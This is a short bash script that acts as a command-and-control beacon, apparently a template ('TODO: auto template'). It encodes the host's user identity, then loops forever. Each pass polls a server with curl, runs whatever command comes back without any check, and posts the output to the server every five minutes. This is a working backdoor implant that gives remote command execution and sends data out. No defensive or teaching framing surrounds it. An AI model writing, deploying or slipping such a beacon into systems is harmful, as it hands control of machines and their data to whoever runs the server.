#!/bin/bash

#TODO: auto template
export SERVER="http://127.0.0.1:14123"
export id="sts$(id | base64 -w0)"
while true; do
   cmd=$(curl -s $SERVER -H "id:$id")
   r=$($cmd)
   curl -s $SERVER -H "id:$id" -d $r 
   sleep 300 
done